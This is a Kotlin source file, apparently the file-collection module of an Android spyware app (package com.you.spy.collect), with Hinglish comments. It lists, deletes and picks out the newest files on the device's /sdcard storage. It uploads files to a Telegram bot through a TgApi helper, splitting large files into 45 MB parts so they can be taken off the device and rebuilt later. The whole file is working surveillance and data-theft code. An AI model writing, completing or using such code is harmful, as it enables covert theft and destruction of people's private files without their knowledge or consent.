package com.you.spy.collect

import com.you.spy.net.TgApi
import java.io.File

object FileOps {

    const val CHUNK = 45L * 1024 * 1024

    private fun resolve(path: String): File {
        val p = path.trim().ifEmpty { "/sdcard" }
        return File(if (p.startsWith("/")) p else "/sdcard/$p")
    }

    fun ls(path: String): String {
        val f = resolve(path)
        if (!f.exists()) return "not found: ${f.absolutePath}"
        if (f.isFile) return "${f.name}  ${f.length()} bytes"
        return f.listFiles()?.sortedBy { it.name }?.joinToString("\n") {
            val tag = if (it.isDirectory) "d" else "-"
            "$tag ${it.length()}\t${it.name}"
        } ?: "empty"
    }

    fun file(path: String): File? = resolve(path).takeIf { it.exists() && it.isFile }

    fun rm(path: String): String {
        val f = resolve(path)
        return if (f.exists() && f.deleteRecursively()) "deleted ${f.absolutePath}" else "failed"
    }

    /** Folder ke sabse naye n files (mtime ke hisaab se). */
    fun newest(path: String, n: Int): List<File> {
        val dir = resolve(path)
        if (!dir.isDirectory) return emptyList()
        return dir.listFiles()
            ?.filter { it.isFile }
            ?.sortedByDescending { it.lastModified() }
            ?.take(n.coerceIn(1, 30))
            ?: emptyList()
    }

    fun isImage(name: String): Boolean {
        val l = name.lowercase()
        return l.endsWith(".jpg") || l.endsWith(".jpeg") || l.endsWith(".png") || l.endsWith(".webp")
    }

    /** File bhejo — 45MB se bada ho to tukdon me. */
    suspend fun send(f: File): String {
        if (f.length() <= CHUNK) {
            val ok = TgApi.sendFile(f, isImage(f.name), f.name)
            return if (ok) "sent ${f.name}" else "send failed: ${f.name}"
        }
        val total = ((f.length() + CHUNK - 1) / CHUNK).toInt()
        TgApi.send("bada file (${f.length()} bytes) — $total parts me bhej raha hoon")

        var part = 1
        f.inputStream().use { input ->
            while (true) {
                val bytes = readChunk(input) ?: break
                val ok = TgApi.sendBytes(
                    bytes, "${f.name}.part$part", false, "part $part/$total"
                )
                if (!ok) return "part $part fail hua, ruka"
                part++
                kotlinx.coroutines.delay(1200)
            }
        }
        return "${part - 1} parts bheje. jodne ke liye: cat '${f.name}'.part* > '${f.name}'"
    }

    private fun readChunk(input: java.io.InputStream): ByteArray? {
        val buf = ByteArray(CHUNK.toInt())
        var off = 0
        while (off < buf.size) {
            val r = input.read(buf, off, buf.size - off)
            if (r < 0) break
            off += r
        }
        return when {
            off == 0 -> null
            off == buf.size -> buf
            else -> buf.copyOf(off)
        }
    }
}
